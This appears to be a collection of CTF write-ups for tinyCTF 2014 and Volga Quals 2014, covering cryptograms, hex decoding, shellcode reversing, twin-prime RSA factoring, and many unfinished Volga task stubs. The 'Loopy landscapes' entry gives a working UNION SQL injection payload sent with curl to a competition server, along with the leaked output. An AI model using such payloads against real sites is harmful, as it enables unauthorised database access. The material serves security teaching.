* [János the Ripper](janos-the-ripper)
* [NaNNaNNaNNaN…, Batman!](nannannannan-batman)
* [Not exactly Alcatraz](not-exactly-alcatraz)
* [Ooooooh! What does this button do?](ooooooh-what-does-this-button-do)
* [Safer than rot13](safer-than-rot13)
* [Test flag, please ignore](test-flag-please-ignore)
* [tt3441810](tt3441810)
* [What is Loopy landscapes?](what-is-loopy-landscapes)
* [WTC RSA BBQ](wtc-rsa-bbq)

## External write-ups only

* [Valet!](valet)

## Missing write-ups

* none yet
# tinyCTF 2014: Safer than rot13

**Category:** Crypto
**Points:** 100
**Description:**

> [Download file](cry100.zip)

## Write-up

Let’s extract [the provided `cry100.zip` file](cry100.zip):

```bash
$ unzip cry100.zip
Archive:  cry100.zip
  inflating: cry100
```

The extracted `cry100` file is a text document:

```bash
$ file cry100
cry100: ASCII text, with CRLF line terminators
```

It contains the following ciphertext:

```
XMVZGC RGC AMG RVMG HGFGMQYCD VT VWM BYNO, NSVWDS NSGO RAO XG UWFN AF
HACDGMVWF. AIRVFN AII AMG JVRRVC-XVMC, FYRBIG TVIZ ESV SAH CGQGM XGGC
RVMG NSAC A RYIG TMVR NSG SVWFG ESGMG NSGO EGMG XVMC WCNYI NSG HAO
FVRG IVMH JARG MVWCH NV NAZG NSGR VTT NV EAM. OVWM TIAD YF "CV NSYF
YF CVN JMOBNV RO HGAM", YC IVEGMJAFG, EYNS WCHGMFJVMGF YCFNGAH VT
FBAJGF, FWMMVWCHGH XO NSG WFWAI "TIAD" NAD ACH JWMIO XMAJGF. GCUVO.
```

This string is encoded using a substitution cipher. Specifically, it is a [cryptogram](http://en.wikipedia.org/wiki/Cryptogram), a cipher in which each letter is replaced by some other letter. One way to identify a substitution cipher is to run [character frequency analysis](http://en.wikipedia.org/wiki/Letter_frequency) on the ciphertext.

Using a cryptogram solver like [quipqiup.com](http://quipqiup.com/) (and assuming that the cleartext is in English) reveals that the key is `AXJHGTDSYUZIRCVBPMFNWQEKOL`. The cleartext is:

```
BROKEN MEN ARE MORE DESERVING OF OUR PITY, THOUGH THEY MAY BE JUST AS
DANGEROUS. ALMOST ALL ARE COMMON-BORN, SIMPLE FOLK WHO HAD NEVER BEEN
MORE THAN A MILE FROM THE HOUSE WHERE THEY WERE BORN UNTIL THE DAY
SOME LORD CAME ROUND TO TAKE THEM OFF TO WAR. YOUR FLAG IS "NO THIS
IS NOT CRYPTO MY DEAR", IN LOWERCASE, WITH UNDERSCORES INSTEAD OF
SPACES, SURROUNDED BY THE USUAL "FLAG" TAG AND CURLY BRACES. ENJOY.
```

The flag is `flag{no_this_is_not_crypto_my_dear}`.

## Other write-ups and resources

* <http://sugarstack.io/tinyctf-cry-100.html>
* <https://github.com/evanowe/TinyCTF2014-writeups/blob/master/README.md#safer-than-rot13>
* <https://github.com/jesstess/tinyctf/blob/master/rot13/rot13.md>
* <http://barrebas.github.io/blog/2014/10/03/tinyctf/>
# tinyCTF 2014: Test flag, please ignore

**Category:** Misc
**Points:** 10
**Description:**

> [Download file](misc10.zip)

## Write-up

Extracting the provided `misc10.zip` file reveals a text file with the following contents:

```
666c61677b68656c6c6f5f776f726c647d
```

Since this wasn’t accepted as the solution (and neither was `flag{666c61677b68656c6c6f5f776f726c647d}`), I tried to hex-decode it:

```bash
$ xxd -r -p <<< 666c61677b68656c6c6f5f776f726c647d
flag{hello_world}
```

The flag is `flag{hello_world}`.

## Other write-ups and resources

* <http://sugarstack.io/tinyctf-misc-10.html>
* <https://poerhiza.github.io/ctf/2014/10/05/tinyCTF-write_ups-test_flag_please_ignore/>
* <https://github.com/jesstess/tinyctf/blob/master/test/test.md>
# tinyCTF 2014: tt3441810

**Category:** Reverse Engineering
**Points:** 100
**Description:**

> [Download file](rev100.zip)

## Write-up

Let’s extract [the provided `rev100.zip` file](rev100.zip):

```bash
$ unzip rev100.zip
Archive:  rev100.zip
  inflating: rev100
```

The extracted `rev100` file looks like a hexdump:

```bash
$ file rev100
rev100: ASCII text, with CRLF line terminators

$ cat rev100
00400080  68 66 6C 00 00 48 BF 01  00 00 00 00 00 00 00 48
00400090  8D 34 24 48 BA 02 00 00  00 00 00 00 00 48 B8 01
004000A0  00 00 00 00 00 00 00 0F  05 68 61 67 00 00 48 BF
004000B0  01 00 00 00 00 00 00 00  48 8D 34 24 48 BA 02 00
004000C0  00 00 00 00 00 00 48 B8  01 00 00 00 00 00 00 00
004000D0  0F 05 68 7B 70 00 00 48  BF 01 00 00 00 00 00 00
004000E0  00 48 8D 34 24 48 BA 02  00 00 00 00 00 00 00 48
004000F0  B8 01 00 00 00 00 00 00  00 0F 05 68 6F 70 00 00
00400100  48 BF 01 00 00 00 00 00  00 00 48 8D 34 24 48 BA
00400110  02 00 00 00 00 00 00 00  48 B8 01 00 00 00 00 00
00400120  00 00 0F 05 68 70 6F 00  00 48 BF 01 00 00 00 00
00400130  00 00 00 48 8D 34 24 48  BA 02 00 00 00 00 00 00
00400140  00 48 B8 01 00 00 00 00  00 00 00 0F 05 68 70 72
00400150  00 00 48 BF 01 00 00 00  00 00 00 00 48 8D 34 24
00400160  48 BA 02 00 00 00 00 00  00 00 48 B8 01 00 00 00
00400170  00 00 00 00 0F 05 68 65  74 00 00 48 BF 01 00 00
00400180  00 00 00 00 00 48 8D 34  24 48 BA 02 00 00 00 00
00400190  00 00 00 48 B8 01 00 00  00 00 00 00 00 0F 05 68
004001A0  7D 0A 00 00 48 BF 01 00  00 00 00 00 00 00 48 8D
004001B0  34 24 48 BA 02 00 00 00  00 00 00 00 48 B8 01 00
004001C0  00 00 00 00 00 00 0F 05  48 31 FF 48 B8 3C 00 00
004001D0  00 00 00 00 00 0F 05
```

Let’s restore it back to its original form using `xxd`:

```bash
$ xxd -r -p rev100
@�hflH�H@��4$H�H�@�hagH�@�H�4$H�@�H�@�h{pH�@�H�4$H�H@�hop@H�H�4$H�@H�@ hpoH�@0H�4$H�@@H�hpr@PH�H�4$@`H�H�@phetH�@�H�4$H�@�H�h@�}
H�H�@�4$H�H�@�H1�H�<@�
```

Hmm, most of it is garbage, but there are ASCII characters that match the expected flag format `flag{…}` in there as well. Looking more closely, it seems like there are occurrences of `h` followed by two characters that are part of the flag. After some fiddling we end up with this script:

```bash
$ sed "s/  / /g" rev100 | xxd -r | strings -n 1 | grep '^h' | cut -c 2- | tr -d '\n'
flag{poppopret}
```

The flag is `flag{poppopret}`.

## Other write-ups and resources

* <https://poerhiza.github.io/ctf/2014/10/05/tinyCTF-write_ups-tt3441810/>
* <https://github.com/evanowe/TinyCTF2014-writeups/blob/master/README.md#tt3441810>
* <https://gist.github.com/balidani/9022f29dce228c9cd296>
* <https://github.com/jesstess/tinyctf/blob/master/tt3441810/tt3441810.md>
* <http://barrebas.github.io/blog/2014/10/03/tinyctf/>
# tinyCTF 2014: Valet!

**Category:** Exploitable
**Points:** 300
**Description:**

> [Exploit this](pwn300.zip)
> Over here: `nc 54.69.118.120 7000`

## Write-up

```bash
$ unzip pwn300.zip
Archive:  pwn300.zip
  inflating: pwn300

$ file pwn300
pwn300: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, not stripped
```

`pwn300` accepts a `port` argument and starts a service listening on that port. To run it locally, use:

```bash
$ ./pwn300 9001
```

In another window/tab, you can then connect to the service:

```bash
$ nc localhost 9001
Welcome to Google Gamble.
=========================

Google Gamble is easy. Guess the card drawn
from the deck and double your money! Make it all
the way to $1048576 to get a flag! Good luck!

Your current balance: 1$

Select an option:
1. Guess a card
2. Get the flag
3. Quit
```

(TODO)

## Other write-ups and resources

* <https://github.com/jesstess/tinyctf/blob/master/valet/valet.md>
* <http://barrebas.github.io/blog/2014/10/03/tinyctf/>
# tinyCTF 2014: What is Loopy landscapes?

**Category:** Web
**Points:** 200
**Description:**

> <http://54.69.118.120:8000/>

## Write-up

The `column` field on the website is vulnerable to SQL injection. It seems like the query being executed has the format:

```sql
SELECT name, park, country, height FROM rollercoaster WHERE $column LIKE %$value%;
```

…where `$column` is not escaped properly, but `$value` is.

After some manual fiddling, the final payload looks like this: `park = 0 AND 1=0 UNION ALL SELECT 1,hash,3,4 from flag#`.

```bash
$ curl --data "value=x&column=park%20%3D%200%20AND%201%3D0%20UNION%20ALL%20SELECT%201%2Chash%2C3%2C4%20from%20flag%23" 'http://54.69.118.120:8000/index.php'
<html>
    <head>
        <title>Archie's Roller Coaster Page</title>
        <link href='http://fonts.googleapis.com/css?family=EB+Garamond' rel='stylesheet' type='text/css'>
        <link rel="stylesheet" type="text/css" href="style.css"/>
    </head>
    <body>
        <div id="header">Archie's Coasters</div>
        <div id="search" class="whitebox">
            <form name="search" action="index.php" method="post">
                Search for
                <input name="value" type="text" placeholder="Search value"/>
                in
                <select name="column">
                    <option value="name">name</option>
                    <option value="park">park</option>
                    <option value="country">country</option>
                </select>
                <input type="submit" value="Go"/>
            </form>
        </div>
        <div id="content" class="whitebox">
            <table>
                <tr>
                    <th>
                        Name
                    </th>
                    <th>
                        Park
                    </th>
                    <th>
                        Country
                    </th>
                    <th>
                        Height
                    </th>

                </tr><tr><td>1</td><td>flag{unroll_those_loops}</td><td>3</td><td>4 m</td></tr></table>
        </div>
    </body>
</html>
```

The flag is `flag{unroll_those_loops}`.

## Other write-ups and resources

* <https://github.com/jesstess/tinyctf/blob/master/loopy/loopy.md>
* <http://barrebas.github.io/blog/2014/10/03/tinyctf/>
# tinyCTF 2014: WTC RSA BBQ

**Category:** Crypto
**Points:** 200
**Description:**

> [Download file](cry200.zip)

## Write-up

Let’s extract [the provided `cry200.zip` file](cry200.zip):

```bash
$ unzip cry200.zip
Archive:  cry200.zip
  inflating: cry200
```

The extracted `cry200` file is another ZIP file:

```bash
$ file cry200
cry200: Zip archive data, at least v2.0 to extract
```

So let’s extract it as well:

```bash
$ unzip cry200
Archive:  cry200
  inflating: cipher.bin
  inflating: key.pem
```

This is an RSA task, so let’s try to break the public key first. The task title contains a big hint: WTC refers to the Twin Towers, which is a hint at [twin primes](https://en.wikipedia.org/wiki/Twin_prime).

Let’s extract the modulus and exponent from the public key first.

```bash
$ openssl rsa -in key.pem -pubin -text -noout
Public-Key: (8587 bit)
Modulus:
    06:2d:3d:61:c9:24:52:63:01:47:e8:96:70:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:
    ff:ff:ff:ff:ff:ff:ff:ff:ff
Exponent: 65537 (0x10001)
```

This already looks very fishy. Those `\xff` bytes show that the modulus is very close to a power of 2, multiplied by some number. Factoring this number would be impossible if we started from the beginning, but we can find the square root of the number and start from there. The following script does just that:

```python
def isqrt(n):
  x = n
  y = (x + n // x) // 2
  while y < x:
    x = y
    y = (x + n // x) // 2
  return x

n = 67957992944541709079637331495835288051017736172946219268979124310219676901814634141994056910249665182493729973853745613557654443204907939100289830019879722192443748372464385547701814777428863933615522890059773474417386931884425569247554583568455670977507333610910984675277207738543785144821532814109666026143830882670492412501367418900259525020329476259602896533289977520877332000639367622359213599508853567838502735818733930199768810238363613613753812700686852922490193705926713608040249887743216661319134457665231243871456616938275370046526015614319970725259025037328092187037543179610573655207460380491069632574369131778109901652462838149658009709174356861767870204803806924289315954871595222073859185353284268587331267173728221658781990119401252167899826047588583247362298572788397512447184590473718761927222549389515152849248566281272354480116085470203137413924993107429630882329043259530840382880179158766903387472716587067982240678129096467201138461960380680792953534366991098348930562736587887507018304132204828793333486018470656056870548645765390879310100168147762901154890481163444481122296433539288905754638768700952492512406731460604412447424967642115057341729310735982961515248311488333222612609961196477124084039771246638999119951171033639602489932159455170406551791127198312487436473494597495007637073871513066738388720194946877125132719068351961085662002556667562192631487439603084021927891681500086528284664252971146275389474911554158614058033716200975019522317823518017673425098559715637356338155079086810436188632405309750833509905138561418180066417475648209078560221064551872389391920606516486209161430247427717376721027499023891011742164463421915449354247944433039198608877315066424065203739793333831943021283319660097829517280179002430376294322395829290502762707146363340431306946572116838111246133390539315819023086956548363452657425340012155573512351731935196011505710069798425307656340650313899667019621505845424588367900827398564048322933092059258373872118350187669748998950161402077367239291462315563970921983573721268515566367155707585109243757143789901450148994239501684623655163637997105769222959494325064113278738038394139099703042640054592379346782002980751786063951491138135071807202634411442713870047730189971333170418112077390015852729766594918955255488280027359348811304774349052504612270369695008061623968574970758347117606577939555446238067430685787886502742201372798852010893885999941946548336103402517187248492765699490151394806591149028320530966365733320484047650429644420042692902092613911608152310152409036167526533619822851411589502970363903
e = 65537

i = isqrt(n)

p, q = 0, 0

while True:
  if n - (i * (n / i)) == 0:
    p = i
    q = n/i
    break
  i += 1

print p
print q
```

This gives us `p` and `q`, which are indeed twin primes. All we have to do now is to decrypt `cipher.bin`.
We can achieve this with the following script:

```python
n = 67957992944541709079637331495835288051017736172946219268979124310219676901814634141994056910249665182493729973853745613557654443204907939100289830019879722192443748372464385547701814777428863933615522890059773474417386931884425569247554583568455670977507333610910984675277207738543785144821532814109666026143830882670492412501367418900259525020329476259602896533289977520877332000639367622359213599508853567838502735818733930199768810238363613613753812700686852922490193705926713608040249887743216661319134457665231243871456616938275370046526015614319970725259025037328092187037543179610573655207460380491069632574369131778109901652462838149658009709174356861767870204803806924289315954871595222073859185353284268587331267173728221658781990119401252167899826047588583247362298572788397512447184590473718761927222549389515152849248566281272354480116085470203137413924993107429630882329043259530840382880179158766903387472716587067982240678129096467201138461960380680792953534366991098348930562736587887507018304132204828793333486018470656056870548645765390879310100168147762901154890481163444481122296433539288905754638768700952492512406731460604412447424967642115057341729310735982961515248311488333222612609961196477124084039771246638999119951171033639602489932159455170406551791127198312487436473494597495007637073871513066738388720194946877125132719068351961085662002556667562192631487439603084021927891681500086528284664252971146275389474911554158614058033716200975019522317823518017673425098559715637356338155079086810436188632405309750833509905138561418180066417475648209078560221064551872389391920606516486209161430247427717376721027499023891011742164463421915449354247944433039198608877315066424065203739793333831943021283319660097829517280179002430376294322395829290502762707146363340431306946572116838111246133390539315819023086956548363452657425340012155573512351731935196011505710069798425307656340650313899667019621505845424588367900827398564048322933092059258373872118350187669748998950161402077367239291462315563970921983573721268515566367155707585109243757143789901450148994239501684623655163637997105769222959494325064113278738038394139099703042640054592379346782002980751786063951491138135071807202634411442713870047730189971333170418112077390015852729766594918955255488280027359348811304774349052504612270369695008061623968574970758347117606577939555446238067430685787886502742201372798852010893885999941946548336103402517187248492765699490151394806591149028320530966365733320484047650429644420042692902092613911608152310152409036167526533619822851411589502970363903
p = 260687538913047604611581784183499992008451760653785074016920718323190075912750802620741024634382067897986936407072164858654195035172056629230527593989978466296098220579031027154724041642557344915423242566240332284307941704981938020407661739104882149483433969072174052675580644164713319546908058746795753762649896919296312912702039493797237183118384499796757914157936629672274357161577311007769338358918777509136488505959298049498018461823273893799669038335872602861372239911549680531979970541528181711754520442958622706059603000655429088872469604344301647170492716926975027102329909258120989355802343558462047316328752521306824960655230501606894696454547299868668551619819367530969111390441903346427083466873717778205853984905381790237396069409514016317067322105019049986366714245693681256834514176535381210683575566036929609986694319036120560201862975426434985372574748540556000702736560930190396248279747095930579691977036607335841985416541503515963817848780705827093841092321324825882821075072622553561916744473353548759606182352622008019859330726239330083782855413787656845382479896229326659871568516059343215385393836820040891163826148343904385963328442668250413125432533185139042633099387310968853063208000057718438859818276275817262048678368751842523947169311954597690408896814857060351
q = 260687538913047604611581784183499992008451760653785074016920718323190075912750802620741024634382067897986936407072164858654195035172056629230527593989978466296098220579031027154724041642557344915423242566240332284307941704981938020407661739104882149483433969072174052675580644164713319546908058746795753762649896919296312912702039493797237183118384499796757914157936629672274357161577311007769338358918777509136488505959298049498018461823273893799669038335872602861372239911549680531979970541528181711754520442958622706059603000655429088872469604344301647170492716926975027102329909258120989355802343558462047316328752521306824960655230501606894696454547299868668551619819367530969111390441903346427083466873717778205853984905381790237396069409514016317067322105019049986366714245693681256834514176535381210683575566036929609986694319036120560201862975426434985372574748540556000702736560930190396248279747095930579691977036607335841985416541503515963817848780705827093841092321324825882821075072622553561916744473353548759606182352622008019859330726239330083782855413787656845382479896229326659871568516059343215385393836820040891163826148343904385963328442668250413125432533185139042633099387310968853063208000057718438859818276275817262048678368751842523947169311954597690408896814857060353
e = 65537

def egcd(a, b):
  if a == 0:
    return (b, 0, 1)
  else:
    g, y, x = egcd(b % a, a)
    return (g, x - (b // a) * y, y)

def modinv(a, m):
  g, x, y = egcd(a, m)
  if g != 1:
    raise Exception('modular inverse does not exist')
  else:
    return x % m

cipher = open('cipher.bin', 'rb').read().encode('hex')
cipher = int(cipher, 16)

fi = (p-1)*(q-1)
d = modinv(e, fi)

flag = pow(cipher, d, n)
print ('%x' % flag).decode('hex')
```

After executing this, we get the flag in the output:

```
Congratulations! Here is a treat for you: flag{how_d0_you_7urn_this_0n?}
```

## Other write-ups and resources

* <https://github.com/jesstess/tinyctf/blob/master/rsa/rsa.md>
# Volga Quals CTF 2014: Admin 100

**Category:** Admin
**Points:** 100
**Description:**

> In that interval, Tom, you must write the book you've wanted to write - no, not the book you were working on for them, son, no, for they're dead and gone and it can't be changed. No, this time it's a book for us, living, that's the book we want. A book you can leave with us, for you, a book bigger and better in every way than anything you ever wrote; say you'll do it, Tom, say you'll dig a short text about Mars?
>
> HINT: Wikipedia may work not over HTTP
> HINT 2: digging is the right way to get flag

## Write-up

(TODO)

## Other write-ups and resources

* <http://singularityctf.blogspot.ru/2014/03/volgactf-quals-2014-writeup-admin-100.html>
# Volga Quals CTF 2014: Admin 200

**Category:** Admin
**Points:** 200
**Description:**

> We get strange server image from a rival company, there is some fractured information on this server. Intel also said that this company used SNMP for storing valuable data. Also it said that first part of data are deployed on 192.168.16.46
>
> btsync: BJFU7DDSNOOJCMHDVYIFUJUGNPSKL3LM3
>
> https://s3.amazonaws.com/volgactf/admin/Ubuntu.ova
>
> DEPLOYMENT INSTRUCTIONS FOR TEAMS:
> You need to deploy ova in your virtual box and attach a host-only network to it. Network for host-only adapter is 192.168.16.0/24, address for your adapter is 192.168.16.1
> Please give a virtual machine as much memory as you can.

## Write-up

(TODO)

## Other write-ups and resources

* <http://singularityctf.blogspot.ru/2014/04/volgactf-quals-2014-writeup-admin-200.html>
# Volga Quals CTF 2014: Admin 300

**Category:** Admin
**Points:** 300
**Description:**

> We found some scientific script. What will be in output for 63787391?

> [https://s3.amazonaws.com/volgactf/admin/script.txt](script.txt)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Volga Quals CTF 2014: Admin 400

**Category:** Admin
**Points:** 400
**Description:**

> We have found an old drive with sensitive data. It was destroyed by radiation and aggressive environment. Can you restore it?
>
> https://s3.amazonaws.com/volgactf/admin/admin400.ova

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Volga Quals CTF 2014: Admin 500

**Category:** Admin
**Points:** 500
**Description:**

> At the dawn of mars colonization corporate wars were extremely common.
> Best technologies mankind ever made were turned into thousands of new ways to kill.
> Every single corporate war were a real bloody hell and 80% of corporate mercenaries were dead in two to three weeks.
> That's not straight the point of this task. There is a legend being told about engeneering squad sergeant who didn't wanted to just disappear. So, few minutes before he was burnt by napalm strike he was able to attach personal distress beacon to the nearby high power radio-relay tower, record and set some random destination route trom inside the radiorelay network in hope that he who finds message will report srgt's death to HQ.
> Legend says that beacon is still functional and dead srgt's message is circulating in radio relay network for decades without being noticed.
> We know the destination net of the message, however land around the destination tower is highly radioactive, so no live being is able to approach. There is a service terminal allowing to connect your equipment to destination tower and one of beacon-facing towers channels via high power radio, with shitty channel quality however. Towers are using ancient and vulnerable as hell routing protocols. We believe that with your skills you'll be able to reroute dead man's message and recover his personal id number thus he wouldn't be forgotten.
> This personal id is a key for the task. Beacon message destination is 10.x%@.200.0/29.
> Good luck.
>
> http://quals.2014.volgactf.ru/admin\_500\_key\_config
>
> HINT: There are some hosts with telnet in your network

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Volga Quals CTF 2014: Crypto 100

**Category:** Crypto
**Points:** 100
**Description:**

> Could you decipher this text?
> tasks.2014.volgactf.ru:28121
>
> [https://s3.amazonaws.com/volgactf/crypto/100/question.txt](question.txt)
>
> NOTE: Ciphertext updated. Again.
>
> HINT: The plaintext we encrypted using the oracle is a single meaningful word.

## Write-up

(TODO)

## Other write-ups and resources

* <http://lights-out-ctf.ghost.io/volgactf-2014-quals-crypto-100/>
* <http://sigint.ru/writeups/2014/04/07/volga-ctf-2014-writeups/#crypto-100>
# Volga Quals CTF 2014: Crypto 200

**Category:** Crypto
**Points:** 200
**Description:**

> We've managed to intercept several encrypted messages. It seems that all of them had been encrypted using one and the same key. Is it possible to decrypt them or the cypher is indeed perfect?
>
> btsync: B3GKBEBWTNX27L666M6QG5H2HOURMCQGI
>
> [https://s3.amazonaws.com/volgactf/crypto/200/ciphertexts.txt](ciphertexts.txt)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctftime.org/writeup/1024>
# Volga Quals CTF 2014: Crypto 300

**Category:** Crypto
**Points:** 300
**Description:**

> The message written on the surface of the encrypted image is of immense importance. As such it shall be recovered. We managed to get the source code of the program having been used to encrypt it. Although the key is unknown, it doesnâ€™t sound especially challenging, does it?
>
> btsync: B4DCOVBS6YOATI63BPOJJ2RZA7ACA7CUW
>
> link1 [https://s3.amazonaws.com/volgactf/crypto/300/enc_image.png.bin](enc_image.png.bin)
>
> link2 [https://s3.amazonaws.com/volgactf/crypto/300/encryptor.zip](encryptor.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <http://singularityctf.blogspot.ru/2014/04/volgactf-quals-2014-writeup-crypto-300.html>
* <http://lights-out-ctf.ghost.io/volgactf-2014-quals-crypto-300/>
# Volga Quals CTF 2014: Crypto 400

**Category:** Crypto
**Points:** 400
**Description:**

> The only encryption routine you can trust - is the one you wrote yourself. Need a proof - try to decrypt the ciphertext in the file https://s3.amazonaws.com/volgactf/crypto/400/flag.txt.bin!
>
> source code[ https://s3.amazonaws.com/volgactf/crypto/400/main.cpp](main.cpp)

## Write-up

(TODO)

## Other write-ups and resources

* <http://singularityctf.blogspot.ru/2014/04/volgactf-quals-2014-writeup-crypto-400.html>
# Volga Quals CTF 2014: Crypto 500

**Category:** Crypto
**Points:** 500
**Description:**

> The Kerckhoffs' assumption is generally regarded as a sound principle. It seems though that one of the two binaries was used to encrypt the other, which means the latter has something useful inside. Can you find out what it is?
>
> link1 [https://s3.amazonaws.com/volgactf/crypto/500/cryptor.rar](cryptor.rar)
>
> link2 [https://s3.amazonaws.com/volgactf/crypto/500/strange.exe.bin](strange.exe.bin)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Volga Quals CTF 2014: Exploit 100

**Category:** Exploit
**Points:** 100
**Description:**

> This server (tasks.2014.volgactf.ru:28111) requires a password, which you certainly donâ€™t know. However it makes some strange computations during password processing. Can it somehow help you?
>
> btsync: BCO5XEZAFALRGHZAV4COSCRBPQONB44AK
>
> [https://s3.amazonaws.com/volgactf/exploits/100/server](server)

## Write-up

(TODO)

## Other write-ups and resources

* <http://sigint.ru/writeups/2014/04/07/volga-ctf-2014-writeups/#exploits-100>
# Volga Quals CTF 2014: Exploit 200

**Category:** Exploit
**Points:** 200
**Description:**

> To support supply flow to Mars parcels are sent. Some of these parcels contain strategic data. Parcels are sorted on tasks.2014.volgactf.ru:28112. Our intel said that sorting of big volumes is hard for sorting center.
>
